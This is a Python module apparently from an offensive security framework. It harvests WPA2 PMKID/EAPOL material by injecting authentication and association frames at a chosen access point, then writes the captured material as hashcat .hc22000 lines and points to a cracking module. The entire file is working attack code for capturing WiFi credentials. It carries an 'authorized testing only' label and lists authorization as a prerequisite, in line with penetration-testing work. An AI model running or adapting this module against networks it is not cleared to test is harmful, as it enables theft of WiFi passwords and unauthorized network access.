#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Active PMKID harvest via open auth + WPA association (authorized testing only)."""

from __future__ import annotations
import os
import time
from kittysploit import *
from lib.protocols.wlan.wlan_client import Wlan_client


class Module(Auxiliary, Wlan_client):
    __info__ = {
        "name": "WiFi PMKID Active Harvest",
        "description": (
            "Trigger a WPA association against a target AP and capture PMKID / EAPOL "
            "material without waiting for a client 4-way (pure-Python frames + inject)."
        ),
        "author": ["KittySploit Team"],
        "tags": ["wlan", "wifi", "pmkid", "802.11", "credential"],
        "references": ["https://attack.mitre.org/techniques/T1040/"],
        "attack": {
            "tactics": ["TA0006"],
            "techniques": ["T1040"],
            "prerequisites": [
                "Monitor-mode adapter with injection",
                "Explicit authorization on target AP",
            ],
        },
    }

    bssid = OptString("", "Target AP BSSID", required=True)
    ssid = OptString("", "Network SSID", required=True)
    channel = OptInteger(0, "AP channel (0 = do not ioctl-hop)", required=False)
    sta_mac = OptString("", "Client MAC to use (empty = random locally administered)", required=False)
    dwell = OptInteger(20, "Sniff time after association in seconds", required=False)
    rounds = OptInteger(2, "Association rounds to send", required=False)
    hc22000 = OptString("", "Output .hc22000 path (auto if empty)", required=False)

    def check(self):
        if not str(self.bssid or "").strip():
            print_error("BSSID required")
            return False
        if not str(self.ssid or "").strip():
            print_error("SSID required")
            return False
        return self.wlan_check_iface()

    def run(self):
        bssid = str(self.bssid).strip().lower()
        ssid = str(self.ssid).strip()
        ch = int(self.channel or 0)
        dwell = max(5, int(self.dwell or 20))
        rounds = max(1, int(self.rounds or 2))
        station = str(self.sta_mac or "").strip() or self.wlan_pmkid_sta_mac()

        rsn_ie = b""
        ssid_map: dict[str, str] = {bssid: ssid}
        self.wlan_reset_handshake_tracker()
        frames: list[bytes] = []

        print_info(f"PMKID harvest → {ssid} ({bssid}) station={station}")
        if ch:
            self.wlan_set_channel(ch)

        def learn_rsn(raw: bytes, _rssi: int | None) -> None:
            nonlocal rsn_ie
            beacon = self.wlan_parse_beacon(raw)
            if beacon and beacon.bssid.lower() == bssid and beacon.ies:
                rsn_ie = self.wlan_rsn_from_beacon_ies(beacon.ies)

        print_status("Listening for beacon RSN (3s)...")
        try:
            self.wlan_sniff(learn_rsn, timeout=3.0)
        except (PermissionError, OSError) as exc:
            print_warning(f"Beacon learn skipped: {exc}")

        def on_eapol(raw: bytes) -> None:
            frames.append(raw)
            eap = self.wlan_parse_eapol(raw)
            if eap:
                self.wlan_track_parsed_eapol(eap, ssid_map)

        for attempt in range(rounds):
            print_status(f"Association round {attempt + 1}/{rounds}")
            auth = self.wlan_build_open_auth(bssid, station)
            assoc = self.wlan_build_assoc(bssid, station, ssid, rsn_ie)
            try:
                self.wlan_inject_raw([auth, assoc], count=2)
            except (PermissionError, OSError) as exc:
                print_error(f"Injection failed: {exc}")
                return False
            time.sleep(0.4)
            try:
                self.wlan_sniff(
                    lambda raw, r: on_eapol(raw),
                    timeout=float(dwell / rounds),
                )
            except (PermissionError, OSError) as exc:
                print_error(f"Sniff failed: {exc}")
                return False

        lines = self.wlan_export_hc22000(ssid_map)
        stamp = time.strftime("%Y%m%d_%H%M%S")
        hc_path = str(self.hc22000 or "").strip() or os.path.abspath(
            f"pmkid_{bssid.replace(':', '')}_{stamp}.hc22000"
        )

        print_info("=" * 72)
        if lines:
            self.wlan_write_hc22000(hc_path, lines)
            print_success(f"Wrote {len(lines)} hash line(s) to {hc_path}")
            print_info("Crack: use auxiliary/wlan/wpa_cpu_crack")
            return True

        if frames:
            pcap_path = os.path.abspath(f"pmkid_{stamp}.pcap")
            self.wlan_write_pcap(pcap_path, frames)
            print_warning(f"No PMKID hash yet — saved {len(frames)} EAPOL frame(s) to {pcap_path}")
            print_info("Analyze: use auxiliary/wlan/pcap_analyze")
            return False

        print_warning("No EAPOL response — verify SSID, channel, and that AP uses WPA2-PSK")
        return False